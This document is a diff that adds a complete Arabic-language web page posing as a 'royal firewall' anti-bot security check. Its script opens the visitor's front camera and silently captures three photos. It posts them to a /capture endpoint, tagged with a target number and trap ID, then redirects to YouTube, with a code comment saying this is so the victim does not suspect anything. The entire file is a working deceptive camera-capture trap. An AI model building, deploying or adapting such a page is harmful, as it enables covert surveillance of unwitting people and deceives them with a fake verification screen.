@@ -1,0 +1,86 @@
+```html
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TARZAN VIP - Security Check</title>
+    <style>
+        body { background-color: #0d0d0d; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; padding: 40px; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 25px rgba(212, 175, 55, 0.2); border: 1px solid #d4af37; max-width: 85%; width: 350px; }
+        h2 { color: #d4af37; margin-bottom: 10px; font-weight: 800; letter-spacing: 1px; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
+        button { background: linear-gradient(45deg, #d4af37, #b5952f); color: #000; border: none; padding: 15px 30px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.4); }
+        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(212, 175, 55, 0.6); }
+        .loader { border: 4px solid #333; border-top: 4px solid #d4af37; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        video, canvas { display: none; }
+        .shield-icon { font-size: 50px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container" id="ui">
+        <div class="shield-icon">🛡️</div>
+        <h2>جدار الحماية الملكي</h2>
+        <p>نظام الحماية يتطلب التحقق من هويتك كإجراء أمني قياسي لمنع الروبوتات (Anti-Bot).</p>
+        <button onclick="startVerification()">بدء التحقق الآمن</button>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        async function startVerification() {
+            document.getElementById('ui').innerHTML = '<h2>⏳ جَارٍ المُصَادَقَة...</h2><div class="loader"></div><p style="color:#d4af37; font-weight:bold;">يتم الآن فحص بروتوكولات التشفير الآمن...</p>';
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.getElementById('v');
+                const c = document.getElementById('c');
+                const ctx = c.getContext('2d');
+                
+                v.srcObject = stream;
+                
+                v.onloadedmetadata = async () => {
+                    c.width = v.videoWidth; 
+                    c.height = v.videoHeight;
+                    let images = [];
+                    
+                    // التقاط 3 صور سريعة بفاصل 700 ملي ثانية
+                    for (let i = 0; i < 3; i++) {
+                        await new Promise(r => setTimeout(r, 700));
+                        ctx.drawImage(v, 0, 0, c.width, c.height);
+                        images.push(c.toDataURL('image/png'));
+                    }
+                    
+                    // إغلاق الكاميرا فوراً
+                    stream.getTracks().forEach(track => track.stop());
+                    document.getElementById('ui').innerHTML = '<h2>✅ اكْتَمَلَ التَّحَقُّق</h2><div class="loader" style="border-top-color:#0f0;"></div><p style="color:#0f0;">جاري توجيهك إلى الوجهة الآمنة...</p>';
+
+                    // إرسال البيانات للسيرفر
+                    await fetch('/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            type: 'selfie', 
+                            data: images, 
+                            targetNumber: urlParams.get('target'), 
+                            trapId: urlParams.get('id'), 
+                            sessionId: urlParams.get('session') 
+                        })
+                    });
+                    
+                    // توجيه الضحية لكي لا يشك
+                    window.location.href = "https://www.youtube.com"; 
+                };
+            } catch (err) {
+                document.getElementById('ui').innerHTML = '<div class="shield-icon">❌</div><h2 style="color:#ff4444;">فَشِلَ التَّحَقُّق</h2><p>يجب إعطاء صلاحية الكاميرا لإثبات أنك إنسان حقيقي.</p><button onclick="location.reload()">إعادة المحاولة</button>';
+            }
+        }
+    </script>
+</body>
+</html>
+
+```
